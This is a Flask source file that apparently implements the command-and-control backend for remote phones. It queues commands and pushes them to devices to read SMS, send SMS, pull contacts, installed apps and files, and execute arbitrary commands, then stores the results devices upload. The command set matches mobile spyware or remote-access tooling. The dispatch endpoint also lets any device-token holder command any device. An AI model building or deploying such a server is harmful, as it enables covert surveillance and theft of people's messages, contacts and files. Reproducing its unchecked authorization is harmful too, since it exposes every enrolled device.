from flask import Blueprint, request, jsonify
from flask_jwt_extended import jwt_required, get_jwt_identity, get_jwt
from app import db, socketio
from app.models.device import Device
from app.models.command import Command
from datetime import datetime
import json

commands_bp = Blueprint('commands', __name__)

# Phase 1 allowed command types
PHASE1_COMMAND_TYPES = {
    'GET_SMS',
    'SEND_SMS',
    'GET_CONTACTS',
    'GET_INSTALLED_APPS',
    'GET_FILES',
    'EXECUTE_COMMAND',
}

@commands_bp.route('/api/commands', methods=['POST'])
@jwt_required()
def create_command():
    """Create and dispatch a command to a device (Phase 1)"""
    claims = get_jwt()
    if claims.get('type') != 'device':
        return jsonify({'error': 'Invalid token type'}), 403

    data = request.get_json() or {}
    device_id_str = data.get('device_id')
    command_type = data.get('type')
    payload = data.get('payload', {})

    if not device_id_str or not command_type:
        return jsonify({'error': 'device_id and type required'}), 400

    if command_type not in PHASE1_COMMAND_TYPES:
        return jsonify({'error': 'Invalid command type'}), 400

    device = Device.query.filter_by(device_id=device_id_str).first()
    if not device:
        return jsonify({'error': 'Device not found'}), 404

    # Create command row
    cmd = Command(
        device_id=device.id,
        command_type=command_type,
        command_data=json.dumps(payload),
        status='pending',
        created_at=datetime.utcnow(),
    )
    db.session.add(cmd)
    db.session.commit()

    # Emit to device room via Socket.IO (room named by device_id string)
    socketio.emit('command', {
        'id': cmd.id,
        'type': command_type,
        'payload': payload,
        'created_at': cmd.created_at.isoformat(),
    }, room=device_id_str)

    return jsonify({'command_id': cmd.id, 'status': 'dispatched'}), 201


@commands_bp.route('/api/commands/<device_id>/pending', methods=['GET'])
@jwt_required()
def get_pending_commands(device_id):
    """Return pending commands for the requesting device (polling fallback)"""
    claims = get_jwt()
    identity = get_jwt_identity()
    if claims.get('type') != 'device' or identity != device_id:
        return jsonify({'error': 'Unauthorized'}), 403

    device = Device.query.filter_by(device_id=device_id).first()
    if not device:
        return jsonify({'error': 'Device not found'}), 404

    pending = Command.query.filter_by(device_id=device.id, status='pending').order_by(Command.created_at.asc()).limit(10).all()

    # Mark as dispatched (optional step depending on delivery semantics)
    for cmd in pending:
        cmd.status = 'dispatched'
    db.session.commit()

    return jsonify({
        'commands': [{
            'id': cmd.id,
            'type': cmd.command_type,
            'payload': json.loads(cmd.command_data) if cmd.command_data else {},
            'created_at': cmd.created_at.isoformat() if cmd.created_at else None,
        } for cmd in pending]
    }), 200


@commands_bp.route('/api/commands/<int:command_id>/result', methods=['PUT'])
@jwt_required()
def update_command_result(command_id):
    """Update command execution result by the owning device"""
    claims = get_jwt()
    device_identity = get_jwt_identity()
    if claims.get('type') != 'device':
        return jsonify({'error': 'Invalid token type'}), 403

    data = request.get_json() or {}
    cmd = Command.query.get(command_id)
    if not cmd:
        return jsonify({'error': 'Command not found'}), 404

    device = Device.query.filter_by(device_id=device_identity).first()
    if not device or cmd.device_id != device.id:
        return jsonify({'error': 'Unauthorized'}), 403

    status = data.get('status', 'completed')
    result = data.get('result', {})
    error = data.get('error')

    if status == 'completed':
        cmd.mark_completed(result_data=result, result_size=len(json.dumps(result)))
    elif status == 'failed':
        cmd.mark_failed(error_message=error or 'Unknown error')
    else:
        # Allow updating generic fields
        cmd.status = status
        cmd.completed_at = datetime.utcnow()
        cmd.result_data = json.dumps(result) if result else None
        cmd.error_message = error

    db.session.commit()
    return jsonify({'status': 'updated'}), 200
